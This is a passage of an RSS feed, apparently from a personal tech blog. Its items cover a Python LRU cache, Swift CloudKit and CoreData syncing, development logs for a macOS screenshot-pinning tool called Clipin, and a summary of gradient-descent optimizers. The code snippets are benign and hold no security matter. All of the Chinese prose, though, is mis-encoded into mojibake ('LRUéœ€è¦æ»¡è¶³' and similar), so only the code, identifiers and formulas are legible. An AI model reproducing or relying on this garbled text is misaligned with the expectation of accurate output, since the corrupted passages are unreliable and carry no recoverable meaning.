      <pubDate>Sat, 06 Feb 2021 22:58:25 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8Elru%E7%9A%84cache/</guid>
      <description>LRUéœ€è¦æ»¡è¶³ï¼š
 O(1)æ—¶é—´çš„è¯»å†™ å°†æœ€ä¹…æœªè¢«ä½¿ç”¨çš„æ•°æ®å‰”é™¤ å‰”é™¤æ“ä½œåœ¨å†™å…¥çš„æ—¶å€™è¿›è¡Œ  è¦æ»¡è¶³è¿™äº›æ¡ä»¶ï¼Œéœ€è¦å…·å¤‡çš„æ•°æ®ç»“æ„ç‰¹ç‚¹ï¼š
 å“ˆå¸Œè¡¨ï¼šO(1)è¯»å– é“¾è¡¨ï¼šæœ€è¿‘è¢«ä½¿ç”¨çš„åœ¨è¡¨å¤´  æ‰€ä»¥ä½¿ç”¨åŒå‘é“¾è¡¨+å“ˆå¸Œè¡¨çš„ç»„åˆä½œä¸ºcacheç»“æ„ã€‚
Pythonç®€æ˜“å®ç° ä½¿ç”¨Pythonå¿«é€Ÿå®ç°ä¸Šè¿°åŠŸèƒ½ï¼ŒåŒ…æ‹¬æ•°æ®ç»“ç‚¹ã€åŒå‘é“¾è¡¨å’ŒCacheçš„å®ç°ã€‚
æ•°æ®ç»“ç‚¹ class Node:  def __init__(self, key, val):  self.next = None  self.prev = None  self.key = key  self.val = val åŒå‘é“¾è¡¨ class BidirectionalList:  def __init__(self):  self.head = None  self.tail = None   # æ·»åŠ ç»“ç‚¹åˆ°é“¾è¡¨å¤´  def add_node(self, node):  # é“¾è¡¨ä¸ºç©ºæ—¶è®¾ç½®å¤´å°¾èŠ‚ç‚¹  if not self.head:  self.head = node  self.</description>
    </item>
    
    <item>
      <title>Swift5&#43;CloudKit&#43;CoreDataå®ç°å¤šç»ˆç«¯åŒæ­¥</title>
      <link>https://hagemon.github.io/posts/swift5&#43;cloudkit&#43;coredata%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/</link>
      <pubDate>Thu, 04 Feb 2021 22:42:18 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/swift5&#43;cloudkit&#43;coredata%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/</guid>
      <description>CloudKitå’ŒCoreDataçš„é…ç½®å·²ç»æœ‰å¾ˆå¤šèµ„æ–™äº†ï¼Œè¿™é‡Œä¸é˜è¿°ã€‚
Preparation åœ¨åŸºäºCoreDataå’ŒCloudKitçš„é¡¹ç›®ä¸­ï¼Œä¼šåœ¨AppDelegateä¸­è‡ªåŠ¨ç”Ÿæˆcontainerï¼š
lazy var persistentContainer: NSPersistentContainer = {   let container = NSPersistentContainer(name: &amp;#34;Model&amp;#34;)   // get the default store description  guard let description = container.persistentStoreDescriptions.first else {  fatalError(&amp;#34;Could not retrieve a persistent store description.&amp;#34;)  }   // initialize the CloudKit schema  let id = &amp;#34;iCloud.your.id&amp;#34;  // è·å–åŸºäºCloudKitçš„Options  let options = NSPersistentCloudKitContainerOptions(containerIdentifier: id)  description.cloudKitContainerOptions = options  // ç”¨äºè·Ÿè¸ªmergeçš„è®°å½•  description.</description>
    </item>
    
    <item>
      <title>Clipin Log 6. å¤šå±å¹•æ”¯æŒ</title>
      <link>https://hagemon.github.io/posts/clipin-post-6/</link>
      <pubDate>Sat, 09 Jan 2021 21:44:43 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-post-6/</guid>
      <description>å¤šå±å¹•ç¯å¢ƒ åœ¨å¤šå±å¹•ç¯å¢ƒä¸‹ï¼Œå„ä¸ªå±å¹•çš„èµ·å§‹åæ ‡originä¼šæ ¹æ®ç”¨æˆ·åœ¨ç³»ç»Ÿåå¥½è®¾ç½®ä¸­å¯¹æ˜¾ç¤ºå™¨æ’åˆ—çš„è®¾ç½®è€Œä¸åŒï¼Œä¸‹å›¾ç›´è§‚åœ°è¡¨ç¤ºäº†å¤šå±å¹•ç¯å¢ƒä¸‹å„å±å¹•çš„åæ ‡ã€‚
é€šè¿‡screen.visibleFrameå¯ä»¥è®¿é—®å±å¹•åœ¨æ­¤åæ ‡ç³»ä¸‹çš„frameã€‚
å®ç°æ€è·¯  åœ¨ClipManager.shared.start()ä¸­æ£€æµ‹æ‰€æœ‰å±å¹•å¹¶åˆ›å»ºæ§åˆ¶å™¨ å¯¹äºæ¯ä¸ªæ§åˆ¶å™¨ï¼Œè·å–å¯¹åº”æ˜¾ç¤ºå™¨å½“å‰é¡µé¢å›¾åƒ åœ¨æ‰§è¡ŒPinæ“ä½œæ—¶ï¼Œéœ€è¦å°†çª—å£åç§»åˆ°æ­£ç¡®çš„ä½ç½®  class ClipManager { 	// ....   var controllers: [ClipWindowController] = []  // ....  func start() {  NotificationCenter.default.post(name: NotiNames.pinNormal.name, object: nil)  NSApplication.shared.activate(ignoringOtherApps: true)   for screen in NSScreen.screens { // è·å–æ‰€æœ‰å±å¹•  let view = ClipView(frame: screen.frame)  let clipWindow = ClipWindow(contentRect: screen.frame, contentView: view)  let clipWindowController = ClipWindowController(window: clipWindow)  controllers.append(clipWindowController)  self.status = .</description>
    </item>
    
    <item>
      <title>Clipin Log 5. å•å±å¹•Pinå®ç°</title>
      <link>https://hagemon.github.io/posts/clipin-log-5/</link>
      <pubDate>Sat, 09 Jan 2021 21:41:18 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-5/</guid>
      <description>PinåŠŸèƒ½çš„è§¦å‘æ—¶æœºæ˜¯åœ¨ClipManagerçš„selectçŠ¶æ€ä¸‹ç‚¹å‡»å›è½¦æ—¶ï¼Œæ‰€ä»¥åœ¨ClipWindowControllerçš„doneä¸­ï¼Œå°†bitmapRepå’Œå¯¹åº”çš„rectä½œä¸ºå‚æ•°ï¼Œæ‰§è¡ŒPinæ“ä½œ
class ClipWindowController: NSWindowController { 	// ....  @objc func done() {  guard let view = self.clipView,  let rect = view.drawingRect  else {  return  }  guard let bitmapRep = view.bitmapImageRepForCachingDisplay(in: rect) else {return}  view.cacheDisplay(in: rect, to: bitmapRep)   // åˆ©ç”¨bitmapRepè¿›è¡ŒPinæ“ä½œ  PinManager.shared.pin(rep: bitmapRep, rect: rect)  }  	// ....  } PinManagerå•ä¾‹ ä¸»è¦å®Œæˆå°†å›¾åƒä½œä¸ºä¸€ä¸ªæ–°çš„çª—å£ï¼Œå¹¶æ”¾ç½®åœ¨å±å¹•é¡¶å±‚çš„æ“ä½œï¼Œè¿™é‡Œç§°ä¸ºpinæ“ä½œã€‚æºç é‡Œè¿˜å®ç°äº†ä¸€äº›ä¿å­˜å›¾åƒçš„å‡½æ•°ï¼Œåç»­ä¼šåœ¨å°å·¥å…·ä¸­ä½¿ç”¨ã€‚
pinå‡½æ•°åˆå§‹åŒ–äº†é¡µé¢ã€çª—å£å’Œæ§åˆ¶å™¨å¹¶æ˜¾ç¤ºçª—å£ï¼Œåœ¨å¤„ç†ç»“æŸåå‘é€pinEndé€šçŸ¥ã€‚
class PinManager: NSObject {  static let shared = PinManager()  var controllers: [PinWindowController] = []   func pin(rep: NSBitmapImageRep, rect:NSRect) {  let image = NSImage(size: rect.</description>
    </item>
    
    <item>
      <title>Clipin Log 4. é«˜äº®åŒºåŸŸçš„é€‰å–&amp;æ‹–æ‹½&amp;è°ƒæ•´</title>
      <link>https://hagemon.github.io/posts/clipin-log-4/</link>
      <pubDate>Sat, 09 Jan 2021 21:25:34 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-4/</guid>
      <description>é«˜äº®åŒºåŸŸçš„é€‰å– ç¡®å®šäº†é«˜äº®åŒºåŸŸçš„æ¸²æŸ“æ–¹å¼åï¼Œæˆ‘ä»¬åœ¨ClipWindowControllerä¸­æ·»åŠ å¯¹é¼ æ ‡äº‹ä»¶çš„ç›‘å¬ï¼Œç”¨äºè·å–é«˜äº®åŒºåŸŸã€‚
åœ¨ClipWindowControllerä¸­è®¾ç½®ä¸€äº›å˜é‡ï¼Œç”¨æ¥è®°å½•ç”¨æˆ·æ“ä½œè¿‡ç¨‹ä¸­çš„ä¸€äº›NSPointå’ŒNSRectï¼š
class ClipWindowController: NSWindowController {    var clipView: ClipView?  var screenImage: NSImage?   var lastRect: NSRect? // ä¸Šä¸€ä¸ªå®Œæ•´çš„åŒºåŸŸï¼Œç”¨äºä¿å­˜æ‹–æ‹½æˆ–è°ƒæ•´å‰çš„åŒºåŸŸ  var highlightRect: NSRect? // å½“å‰é«˜äº®çš„åŒºåŸŸï¼Œé€šè¿‡é¼ æ ‡æ“ä½œåŠ¨æ€æ›´æ–°  var startPoint: NSPoint? // ä¸Šä¸€ä¸ªå®Œæ•´åŒºåŸŸçš„origin  var lastPoint: NSPoint? // ä¸Šä¸€æ¬¡æ›´æ–°åŒºåŸŸæ—¶é¼ æ ‡çš„ä½ç½®   // functions .... } å®ç°æ€è·¯ï¼š  é¼ æ ‡è½ä¸‹æ—¶çŠ¶æ€å˜ä¸ºstartï¼Œå¹¶è®°å½•è½ä¸‹ä½ç½®ä¸ºé«˜äº®åŒºåŸŸçš„startPoint é¼ æ ‡æ‹–æ‹½æ—¶é€šè¿‡å½“å‰ä½ç½®å’ŒstartPointåˆ›å»ºæ–°çš„Rectï¼Œç”¨äºæ›´æ–°highlightRect  å…¶ä¸­ç”¨åˆ°mouseDownã€mouseUpã€mouseDragè¿™ä¸‰ä¸ªäº‹ä»¶ç›‘å¬ï¼š
override func mouseDown(with event: NSEvent) {  let location = event.locationInWindow  switch ClipManager.shared.status {  case .</description>
    </item>
    
    <item>
      <title>Clipin Log 3. æˆªå±é¡µé¢çš„å®ç°</title>
      <link>https://hagemon.github.io/posts/clipin-log-3/</link>
      <pubDate>Sat, 09 Jan 2021 21:24:06 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-3/</guid>
      <description>å®ç°æ€è·¯  åˆ›å»ºå’Œå±å¹•å¤§å°ç›¸ç­‰çš„NSWindowï¼Œä¸”æ‹¥æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š  borderless contentviewé€æ˜èƒŒæ™¯ levelåœ¨å…¶ä½™çª—å£ä¹‹ä¸Š   æ•æ‰é«˜äº®åŒºåŸŸ é‡è½½NSWindow.contentViewä¸­çš„drawæ–¹æ³•ï¼Œæ¸²æŸ“é«˜äº®åŒºåŸŸçš„å›¾åƒè¦†ç›–èƒŒæ™¯ æŒ‰ä¸‹ESCé€€å‡ºClip æŒ‰ä¸‹Enterå®Œæˆå¯¹é«˜äº®åŒºåŸŸå›¾åƒçš„è·å– ç”¨NSWindowControlleræ§åˆ¶ä»¥ä¸Šè¡Œä¸º  å®ç°è¿‡ç¨‹ åˆ›å»ºNSWindowControllerï¼ŒNSWindowï¼ŒNSViewå¯¹åº”çš„å­ç±»ã€‚
åœ¨ClipManager.shared.start()ä¸­åˆ›å»ºæ§åˆ¶å™¨ã€çª—å£å’Œé¡µé¢çš„å¯¹è±¡å¹¶å»ºç«‹å…³ç³»ï¼š
func start() { 	guard let screen = NSScreen.main else { return } // å•æ˜¾ç¤ºå™¨ç¯å¢ƒ 	NSApplication.shared.activate(ignoringOtherApps: true) // åœ¨è§¦å‘å¿«æ·é”®åæ¿€æ´»Appï¼Œä½¿å¼€å¯çš„çª—å£èƒ½å¤Ÿå˜ä¸ºkey window  let view = ClipView(frame: screen.frame)  let clipWindow = ClipWindow(contentRect: screen.frame, contentView: view)  let clipWindowController = ClipWindowController(window: clipWindow)  self.controllers.append(clipWindowController) // å°†å…¶åŠ å…¥å½“å‰ä¿å­˜çš„æ§åˆ¶å™¨ä¸­  self.status = .ready  clipWindowController.capture(screen) } ClipWindowçš„æ¡ä»¶åœ¨åˆå§‹åŒ–æ—¶æ—¢å¯ä»¥æ»¡è¶³ï¼š</description>
    </item>
    
    <item>
      <title>Clipin Log 2. æˆªå±ç®¡ç†å™¨</title>
      <link>https://hagemon.github.io/posts/clipin-log-2/</link>
      <pubDate>Sat, 09 Jan 2021 21:13:22 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-2/</guid>
      <description>Manager/ClipManager.swift
æˆªå±çŠ¶æ€ enum ClipStatus {  case off // æœªå¼€å¯  case ready // å°±ç»ª  case start // å¼€å§‹é€‰æ‹©åŒºåŸŸ  case select // å·²é€‰æ‹©åŒºåŸŸ  case adjust // è°ƒæ•´åŒºåŸŸå¤§å°  case drag // æ‹–æ‹½åŒºåŸŸ } æˆªå±çš„çŠ¶æ€è½¬ç§»å¯ä»¥è¡¨è¿°ä¸ºä¸‹å›¾
å•ä¾‹ ä½¿ç”¨å•ä¾‹æ¥æ§åˆ¶Clipçš„æ“ä½œï¼š
import Cocoa  class ClipManager {   static let shared = ClipManager() // å•ä¾‹  var status: ClipStatus = .off // Clipåˆå§‹çŠ¶æ€ 	var controllers: [ClipWindowController] = [] // ä¿å­˜å½“å‰æ‰“å¼€çš„æ‰€æœ‰æ§åˆ¶å™¨   private init() {  NotificationCenter.</description>
    </item>
    
    <item>
      <title>Clipin Log 1. åŸºäºStatus Barçš„åº”ç”¨&amp;ç›‘å¬å¿«æ·é”®</title>
      <link>https://hagemon.github.io/posts/clipin-log-1/</link>
      <pubDate>Sat, 09 Jan 2021 20:53:34 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-1/</guid>
      <description>åˆ›å»ºä¸€ä¸ªåŸºäºStatus Barçš„åº”ç”¨ åŸºäºStatus Barçš„åº”ç”¨ä¸éœ€è¦è®¾ç½®é¢å¤–çš„UIï¼Œæ‰€ä»¥ä¸éœ€è¦ä½¿ç”¨StoryBoardï¼Œåªè¦åœ¨AppDelegateä¸­é…ç½®å¥½ç›¸åº”çš„StatusBarItemå³å¯ã€‚
Storyboard ç”±äºæ˜¯åŸºäºStatus Barçš„åº”ç”¨ï¼Œæ‰€ä»¥åœ¨Storyboardä¸­å°†é¡µé¢ç›¸å…³çš„ç»„ä»¶éƒ½åˆ é™¤äº†ï¼Œä¿ç•™äº†Menuç›¸å…³çš„ç»„ä»¶ã€‚
é…ç½®info.plist åœ¨info.plistä¸­æ·»åŠ åä¸ºApplication is agent (UIElement)çš„keyï¼Œå¹¶å°†valueå€¼è®¾ç½®ä¸ºYESã€‚è¿™æ ·Appå°±ä¸ä¼šåœ¨Dockä¸­æ˜¾ç¤º
AppDelegate åœ¨AppDelegateä¸­åˆ›å»ºStatusBaræŒ‰é’®å¹¶é…ç½®å¯¹åº”çš„action
import Cocoa  @main class AppDelegate: NSObject, NSApplicationDelegate {   let statusItem = NSStatusBar.system.statusItem(withLength:NSStatusItem.squareLength)   func applicationDidFinishLaunching(_ aNotification: Notification) {  guard let button = self.statusItem.button else { return }  button.image = NSImage(named: NSImage.Name(&amp;#34;StatusBarIcon&amp;#34;)) // StatusBarIcon is in Assets.xcassets  button.action = #selector(showMenu)  }   func applicationWillTerminate(_ aNotification: Notification) {  // Insert code here to tear down your application  }   @objc func showMenu() {//to be do} } ç›‘å¬å¿«æ·é”® åŸºäºHotKeyå®ç°å¯¹å…¨å‰§å¿«æ·é”®çš„ç›‘å¬ï¼ŒHotKeyåº•å±‚ä½¿ç”¨äº†Carbonçš„RegisterEventHotKeyæ¥å£ï¼š</description>
    </item>
    
    <item>
      <title>Clipin Log 0. Mac OSä¸Šæˆªå›¾&amp;ä¿ç•™å°å·¥å…·çš„å¼€å‘è®°å½•</title>
      <link>https://hagemon.github.io/posts/clipin-log-0/</link>
      <pubDate>Sat, 09 Jan 2021 20:50:05 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-0/</guid>
      <description>æºç åœ°å€ï¼šhttps://github.com/hagemon/Clipin
æºç çš„ç‰ˆæœ¬ä¸ºSwift 5.0ã€‚
æˆ‘ä»¬å°†æˆªå›¾æ“ä½œç§°ä¸ºClipï¼Œå°†æˆªå›¾é’‰åœ¨å±å¹•ä¸Šçš„æ“ä½œç§°ä¸ºPinã€‚
è¯¥å·¥å…·å¯ä»¥ä¸´æ—¶å°†ä¸€äº›éœ€è¦å¯¹ç…§çš„ä¿¡æ¯ä¿æŒåœ¨å±å¹•æœ€ä¸Šæ–¹ï¼Œï¼ˆæˆ–è®¸ï¼‰èƒ½æé«˜å·¥ä½œæ•ˆç‡ã€‚
è¯¥å·¥å…·åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå‚è€ƒäº†Snipçš„æºç ï¼Œä¸”é›†æˆäº†HotKeyå¼€æºåº“ç›‘å¬å¿«æ·é”®ã€‚
æœ¬æ–‡ç« æ˜¯ä½œè€…åœ¨å¼€å‘è¯¥å·¥å…·è¿‡ç¨‹ä¸­çš„è®°å½•ï¼Œç”±ç®€å…¥ç¹åœ°ä»‹ç»è¯¥å·¥å…·çš„åˆ›å»ºè¿‡ç¨‹ï¼Œå¦‚æ–‡ä¸­æœ‰çº°æ¼æˆ–æ˜¯ä¸å¥åº·çš„ä»£ç ï¼Œè¿˜è¯·å„ä½èµæ•™ã€‚ğŸ˜‹
æœ¬å·¥å…·è¿˜ä¼šæŒç»­åœ°å¼€å‘å’Œç»´æŠ¤ï¼Œè¯¥æ–‡ç« ä¹Ÿä¼šä¸æ–­åœ°æ›´æ–°å’Œä¿®æ”¹ã€‚
é¡¹ç›®æ¶æ„ä»‹ç» æ ¹æ®ä½œè€…ä¸ªäººçš„ä¹ æƒ¯ï¼Œå°†é¡¹ç›®åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ¨¡å—ï¼š
 Utilï¼šä¸€äº›å·¥å…·ç±»ã€å‡½æ•°ã€æšä¸¾å’Œæ‰©å±• Managerï¼šç®¡ç†Clipã€Pinæ“ä½œè¿‡ç¨‹çš„å•ä¾‹ç®¡ç†å™¨ Clipï¼šClipåŠŸèƒ½ç›¸å…³çš„Controllerå’ŒView Pinï¼šPinåŠŸèƒ½ç›¸å…³çš„Controllerå’ŒView  Status baråº”ç”¨çš„ç›¸å…³é…ç½®å’Œå¿«æ·é”®ç›‘å¬ç­‰åŠŸèƒ½åœ¨AppDelegate.swiftä¸­å®ç°ã€‚
é¦–å…ˆè¿›å…¥Status Baråº”ç”¨&amp;amp;ç›‘å¬å¿«æ·é”®ã€‚</description>
    </item>
    
    <item>
      <title>ä¼˜åŒ–æ–¹æ³•æ€»ç»“</title>
      <link>https://hagemon.github.io/posts/%E4%BC%98%E5%8C%96%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</link>
      <pubDate>Sat, 24 Aug 2019 11:47:27 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E4%BC%98%E5%8C%96%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</guid>
      <description>æ€»ç»“ä¸€ä¸‹æœºå™¨å­¦ä¹ ä¸­å¸¸è§çš„å„ç§ä¼˜åŒ–å™¨ã€‚
Batch Gradient Descent(BGD) BGDå¯¹æ•´ä¸ªæ•°æ®é›†è®¡ç®—æ¢¯åº¦ï¼Œå½“æ•°æ®é›†å¾ˆå¤§æ—¶æ‰€éœ€è¦çš„è®¡ç®—èµ„æºå°±å¾ˆå¤§ï¼Œå¦‚æœç›®æ ‡å‡½æ•°æ˜¯å‡¸å‡½æ•°ï¼Œåˆ™å¯ä»¥æ‰¾åˆ°å…¨å±€æœ€ä¼˜è§£ï¼Œå¦åˆ™æ‰¾åˆ°å±€éƒ¨æœ€ä¼˜è§£ã€‚
Stochastic Gradient Descent (SGD) å’ŒBGDç›¸åï¼ŒSGDä¸€æ¬¡åªä½¿ç”¨ä¸€ä¸ªæ ·æœ¬æ¥å¯¹å‚æ•°è¿›è¡Œæ›´æ–°ï¼Œé€Ÿåº¦å¾ˆå¿«ï¼Œä½†æ˜¯å¯èƒ½ç”±äºæ•°æ®é›†ä¸­çš„å™ªå£°å¯¼è‡´å…¶æ¯æ¬¡æ›´æ–°å¹¶ä¸ä¸€å®šèƒ½å¾€æœ€ä¼˜çš„æ–¹å‘æ›´æ–°ï¼Œå‡†ç¡®åº¦æœ‰æ‰€ä¸‹é™ã€‚å¹¶ä¸”å› ä¸ºæ›´æ–°é¢‘ç¹ï¼Œå¯¼è‡´æŸå¤±å‡½æ•°ä¼šæœ‰å¾ˆå¤§çš„åŠ¨è¡
Mini-batch Stochastic Gradient Descent (MSGD) MSGDæ˜¯SGDå’ŒBGDçš„ä¸€ä¸ªæŠ˜ä¸­ï¼Œæ¯æ¬¡ä½¿ç”¨ä¸€ä¸ªå°æ‰¹é‡çš„æ•°æ®æ¥æ›´æ–°æƒé‡ï¼ˆæ‰¹å¤§å°ä¸€èˆ¬å–50-256ï¼‰ã€‚è¿™æ ·å¯ä»¥é™ä½æ¢¯åº¦æ›´æ–°æ—¶çš„æ–¹å·®ï¼Œç›¸å¯¹äºSGDï¼Œæœ‰æ›´ç¨³å®šçš„æ•ˆæœï¼›ç›¸å¯¹äºBGDï¼Œåˆæ›´åŠ åœ°é«˜æ•ˆã€‚
ä½†æ˜¯MSGDéœ€è¦å¯¹å­¦ä¹ ç‡æœ‰ä¸€ä¸ªåˆç†çš„è®¾å®šï¼Œå¦åˆ™ä¸èƒ½ä¿è¯å¾ˆå¥½çš„æ”¶æ•›ã€‚å½“å­¦ä¹ ç‡å¤ªå¤§æ—¶å¯èƒ½ä¼šå¯¼è‡´éœ‡è¡æ¯”è¾ƒå¤§ï¼Œå­¦ä¹ ç‡å°æ—¶ä¼šå¯¼è‡´å…¶è¢«å›°åœ¨å±€éƒ¨æœ€ä¼˜è§£ã€‚
å½“æ•°æ®è¾ƒä¸ºç¨€ç–æ—¶ï¼Œå³æ¯ä¸ªæ ·æœ¬ä¸­å¾ˆå¤šçš„ç‰¹å¾å–å€¼ä¸º0æˆ–æ¥è¿‘0ã€‚ç”±äºå­¦ä¹ ç‡å¯¹äºæ‰€æœ‰çš„å‚æ•°éƒ½æ˜¯ä¸€è‡´çš„ï¼Œå¯¹äºç¨€ç–ç‰¹å¾å¯¹åº”çš„å‚æ•°ï¼Œæ¯æ¬¡æ›´æ–°çš„å¹…åº¦å°±å¾ˆå°ã€‚
Momentum å½“æ›²é¢çš„æŸä¸ªæ–¹å‘æ¯”åˆ«çš„æ–¹å‘æ›´é™¡æ—¶ï¼ŒSGDä¼šå€¾å‘äºå¾€æ›´é™¡çš„æ–¹å‘æ›´æ–°ï¼ˆå› ä¸ºè´Ÿæ¢¯åº¦çš„æ–¹å‘ï¼‰ï¼Œè€Œä¸æ˜¯å¾€ä¸€ä¸ªæ›´ä¼˜çš„æ–¹å‘æ›´æ–°ã€‚
åŠ¨é‡éšæœºæ¢¯åº¦ä¸‹é™åœ¨æ›´æ–°æ¢¯åº¦çš„æ—¶å€™å¢åŠ äº†ä¸€ä¸ªåŠ¨é‡é¡¹ï¼Œè¡¨ç¤ºä¸Šä¸€æ¬¡æ›´æ–°åŠ¨é‡çš„æ”¹å˜å€¼ï¼š
$$v_t=\gamma v_{t-1}+\eta\nabla_\theta f(\theta)$$
$$\theta_t=\theta_{t-1}-v_t$$
å¯¹äºæ¢¯åº¦çš„ä¸åŒç»´åº¦ï¼ˆå³æ¢¯åº¦å‘é‡çš„æŸä¸ªåˆ†é‡ï¼‰ï¼Œæ¯ä¸€æ¬¡çš„æ›´æ–°éƒ½ä¼šæœ‰ä¸€å®šçš„ç§¯ç´¯ã€‚å…·ä½“æ¥è¯´ï¼Œæ¢¯åº¦çš„æ¯ä¸€æ¬¡æ›´æ–°åŒ…æ‹¬ä¸¤éƒ¨åˆ†ï¼Œä¸€æ˜¯å½“å‰çš„æ¢¯åº¦$\nabla_\theta f(\theta)$ï¼Œå¦ä¸€ä¸ªæ˜¯ä¹‹å‰æ‰€æœ‰æ›´æ–°çš„åŠ æƒå’Œ$\gamma v_{t-1}$ã€‚ç”±äº$0&amp;lt;\gamma&amp;lt;1$çš„å­˜åœ¨ï¼Œä¹‹å‰çš„æ›´æ–°$v_1, v_2, v_3\dots$åœ¨$v_t$ä¸­æ‰€å çš„æƒé‡ä¼šä¸æ–­å‡å°ï¼Œä¸”ä¸‹é™çš„é€Ÿåº¦æ˜¯æŒ‡æ•°çº§çš„ã€‚
è‹¥$v_{t-1}^{(i)}$æ˜¯æ­£å€¼ï¼Œè¡¨ç¤ºæ¢¯åº¦åœ¨å¾€åå‘è¿™ä¸ªåˆ†é‡çš„æ–¹å‘ç§»åŠ¨ã€‚å®šä¹‰$v_0=0$ï¼Œåˆ™$v_1$å°±æ˜¯ç¬¬ä¸€æ¬¡çš„æ¢¯åº¦å€¼ã€‚è‹¥æ¢¯åº¦åœ¨æŸä¸ªåˆ†é‡ä¸Šä¸æ–­æä¾›æ­£å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªåˆ†é‡çš„å¢å¹…å°±ä¼šè¶Šæ¥è¶Šå¿«ï¼Œè¿™å°±å’Œè‡ªç”±è½ä½“è¿åŠ¨ä¸­çš„åŠ é€Ÿåº¦ä¸€æ ·ã€‚è‹¥æ¢¯åº¦ä¸æ–­æä¾›è´Ÿå€¼ï¼Œåˆ™å…¶å¢å¹…å°±ä¼šä¸æ–­å‡å°‘ï¼Œç”šè‡³ä¼šå¾€è´Ÿæ–¹å‘å¢åŠ ã€‚è‹¥æ¢¯åº¦çš„æä¾›çš„å€¼åœ¨æ­£è´Ÿé—´æ‘‡æ‘†ï¼Œå³å‡ºç°æŒ¯è¡çš„ç°è±¡ï¼Œåˆ™å®ƒä»¬çš„åŠ¨é‡éƒ¨åˆ†ä¼šç›¸äº’æŠµæ¶ˆï¼Œåœ¨æ­¤ç»´åº¦çš„æ›´æ–°æ­¥ä¼å°±ä¼šå‡ç¼“ã€‚
å›åˆ°æ›²é¢æŸä¸ªæ–¹å‘æ¯”åˆ«çš„æ–¹å‘æ›´é™¡çš„æƒ…å†µï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå°±å¥½åƒæˆ‘ä»¬çš„æŸå¤±å‡½æ•°çš„æ›²é¢æ˜¯ä¸€æ ¹æ°´ç®¡å†…éƒ¨çš„é¢ï¼Œå¦‚æœæˆ‘ä»¬çš„æ°´ç®¡è‡ªç„¶ä¸‹å‚åˆ°åœ°é¢ï¼Œé‚£ä¹ˆæ²¿ç€æ°´æµçš„æ–¹å‘å°±ä¼šæ¯”è¾ƒèƒ½å¿«é€Ÿåˆ°è¾¾åœ°é¢ï¼ˆä¹Ÿå°±æ˜¯å‡½æ•°çš„æœ€ä½ç‚¹ï¼‰ï¼Œç„¶è€Œå› ä¸ºä¸¤ä¾§çš„æ°´ç®¡å£æ¯”è¾ƒé™¡å³­ï¼ŒSGDæ–¹æ³•å°±ä¼šå€¾å‘äºåœ¨æ°´ç®¡å£ä¹‹é—´å·¦å³æ¨ªè·³ã€‚å¦‚æœä½¿ç”¨äº†Momentumï¼Œé‚£ä¹ˆå·¦å³æ¨ªè·³çš„æ—¶å€™ä¼šæŠµæ¶ˆåŠ¨é‡ï¼Œè®©è¯¥æ–¹å‘çš„å˜æ¢å‡å°ï¼Œè€Œç”±äºåŒæ—¶åœ¨ä¸€ç‚¹ç‚¹çš„å¾€æ°´æµæ–¹å‘å‰è¿›ï¼Œæ°´æµæ–¹å‘çš„æ¢¯åº¦å˜åŒ–å°±ä¼šä¸æ–­å¢åŠ ï¼Œä»è€Œæ›´å¿«åˆ°è¾¾æœ€ä½ç‚¹ã€‚
æŒ‰ç»éªŒæ¥è¯´$\gamma=0.9$
Nesterov Accelerated Gradient NAGä¸ä»…åšäº†æ¢¯åº¦çš„ç´¯ç§¯ï¼Œè€Œä¸”è¿˜è€ƒè™‘åˆ°äº†æœªæ¥å¯èƒ½æ–¹å‘ä¸Šçš„æƒ…å†µï¼Œä»è€Œå¯ä»¥åœ¨å°†è¦é‡åˆ°æŸå¤±ä¸Šå‡çš„åœ°æ–¹æ—¶å‡ç¼“é€Ÿåº¦ã€‚
NAGåœ¨è®¡ç®—æ¢¯åº¦å˜åŒ–æ—¶ï¼Œä½¿ç”¨çš„æ˜¯é¢„ä¼°çš„æ¢¯åº¦ï¼Œä¹Ÿå°±æ˜¯å‡è®¾å‚æ•°ä¼šå¾€å½“å‰çš„ç´¯ç§¯é‡çš„æ–¹å‘å˜åŒ–
$v_t=\gamma v_{t-1}+\eta\nabla_\theta f(\theta-\gamma v_{t-1})$
Adagrad Adaç³»çš„æ¢¯åº¦æ›´æ–°æ–¹æ³•ï¼Œä¸»è¦ç›®çš„æ˜¯å¯¹ä¸åŒé‡è¦æ€§çš„ç‰¹å¾å¯¹åº”çš„æƒé‡ï¼Œè¿›è¡Œä¸åŒç¨‹åº¦çš„æ›´æ–°ã€‚ä¸»æ—¨æ€æƒ³æ˜¯å¯¹ä½é¢‘ç‰¹å¾çš„æƒé‡è¿›è¡Œè¾ƒå¤§çš„æ›´æ–°ï¼Œå¯¹é«˜é¢‘ç‰¹å¾çš„æƒé‡è¿›è¡Œè¾ƒå°çš„æ›´æ–°ï¼Œè¿™æ ·ä½¿å¾—å„ä¸ªç‰¹å¾çš„å½±å“åŠ›ç¨å¾®å¹³è¡¡ä¸€äº›ã€‚å…¶è¡¨ç°å½¢å¼ä¸ºï¼š
$$\theta_{i,t}=\theta_{i,t-1}-\frac{\eta}{\sqrt{G_{ii}+\epsilon}}\nabla_{\theta_i}f(\theta)$$
